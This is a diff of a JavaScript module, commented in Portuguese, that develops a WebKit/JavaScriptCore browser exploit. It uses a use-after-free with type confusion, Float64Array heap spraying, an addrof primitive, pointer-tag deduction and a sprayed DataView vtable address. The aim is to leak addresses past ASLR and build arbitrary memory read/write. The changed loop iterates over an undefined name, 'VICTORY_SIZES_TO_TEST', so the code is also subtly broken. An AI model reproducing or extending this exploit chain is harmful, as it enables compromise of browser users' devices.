@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v155 - Correção do RangeError em deduceObjectPointerTag)
+// js/script3/testArrayBufferVictimCrash.mjs (v156 - Correção do ReferenceError e Offset de VTable)
 
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
@@ -26,7 +26,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v155_FIX_RANGE_ERROR";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v156_FIX_REF_ERROR";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -272,16 +272,11 @@ async function deduceObjectPointerTag(logFn) {
     let dummyObj = { a: 1 };
     let dummyObjAddrUntagged = addrof_core(dummyObj);
 
-    // A tag é esperada no HIGH do JSValue. O AdvancedInt64 já está lidando com 32 bits low/high.
-    // O problema pode estar em tentar criar um novo AdvancedInt64 com o resultado de uma operação OR que pode ser interpretada como negativo.
-    // Vamos simular a tag no HIGH de um valor de teste e verificar o resultado.
-
     // Tente com a tag padrão primeiro, pois é a mais comum.
     const TEST_TAG_VALUE = 0x402a0000; 
 
     // Usamos o high real do dummyObjAddrUntagged e adicionamos a tag.
     // O operador >>> 0 em JavaScript garante que um número seja tratado como Uint32.
-    // CORREÇÃO: Aplicar >>> 0 para garantir que o resultado da operação OR seja um Uint32 válido.
     let high_with_potential_tag = (dummyObjAddrUntagged.high() | TEST_TAG_VALUE) >>> 0;
     
     // Criar um AdvancedInt64 com esse valor "taggeado"
@@ -383,13 +378,13 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
     hold_objects.push(spray_arrays);
     logFn("    Pulverização de Float64Array concluída sobre a memória da vítima.", "info");
 
-    return { dangling_ref, initial_victim_fill_value }; // Retorna a referência pendurada e o valor de preenchimento inicial
+    return { dangling_ref, initial_victim_fill_value, spray_value_double_to_leak_ptr }; // Retorna o valor de spray também
 }
 
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
-    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v155_FIX_RANGE_ERROR";
+    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v156_FIX_REF_ERROR";
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");
 
     let final_results = [];
@@ -398,7 +393,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     const VICTIM_SIZES_TO_TEST = [0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 0x100, 0x110, 0x120, 0x130, 0x140]; // Exemplo: múltiplos tamanhos de vítima
     const SPRAY_COUNTS_TO_TEST = [5000, 10000, 15000, 20000]; // Múltiplos volumes de spray
 
-    for (const victim_size of VICTIM_SIZES_TO_TEST) {
+    for (const victim_size of VICTORY_SIZES_TO_TEST) {
         for (const spray_count of SPRAY_COUNTS_TO_TEST) {
             logFn(`\n--- INICIANDO NOVA TENTATIVA: Tamanho Vítima=${victim_size} bytes, Spray Count=${spray_count} ---`, "tool");
             const attemptResult = {
@@ -460,14 +455,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                 JSVALUE_OBJECT_PTR_TAG_HIGH = await deduceObjectPointerTag(logFn);
 
                 // Calcular o valor do vtable da DataView Structure com a tag correta para o spray
-                // Usando mprotect_plt_stub para teste, idealmente seria a vtable real da DataView structure.
                 // A vtable da DataView Structure é JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET
                 const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
                 const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000); // Exemplo de base para construir o double de spray
                 let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
                 
                 // Adicionar a tag ao high do AdvancedInt64 ANTES de converter para double.
-                const tagged_high_for_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | JSVALUE_OBJECT_PTR_TAG_HIGH;
+                const tagged_high_for_spray = (TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | JSVALUE_OBJECT_PTR_TAG_HIGH) >>> 0;
                 TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);
                 
                 // --- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR ---
@@ -477,11 +471,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                 let dangling_info = null;
 
                 try {
+                    // Passar os parâmetros de tamanho de vítima e contagem de spray para a função
                     dangling_info = await sprayAndCreateDanglingPointer(
                         logFn, pauseFn, JSC_OFFSETS_PARAM, victim_size, spray_count, TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64
                     );
                     const dangling_ref_from_uaf = dangling_info.dangling_ref;
                     const initial_victim_fill_value = dangling_info.initial_victim_fill_value;
+                    const spray_value_double_to_leak_ptr = dangling_info.spray_value_double_to_leak_ptr; // Acessar do objeto retornado
 
                     if (!(dangling_ref_from_uaf instanceof Float64Array) || dangling_ref_from_uaf.length === 0) {
                         logFn(`[UAF LEAK] ERRO: A referência pendurada não é um Float64Array ou está vazia após o spray. Tipo: ${Object.prototype.toString.call(dangling_ref_from_uaf)}`, "critical");
@@ -510,7 +506,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                         } else if (!leaked_as_int64.equals(AdvancedInt64.Zero) && !leaked_as_int64.equals(AdvancedInt64.NaNValue)) {
                             // Se é diferente de 0, NaN e do valor inicial, pode ser outra coisa reocupando.
                             logFn(`[UAF LEAK] Valor inesperado lido de dangling_ref[0]: ${toHex(leaked_as_int64, 64)}. Não é o valor inicial nem o spray esperado.`, "warn");
-                            found_non_zero = true; // Considerar como "não zero", mas não como sucesso de vazamento de ASLR.
+                            found_non_zero = true; // Considerar como "não zero", mas não como sucesso.
                             // Não vamos abortar imediatamente aqui, vamos deixar a checagem da tag fazer o trabalho.
                         }
                         await PAUSE(LOCAL_VERY_SHORT_PAUSE);
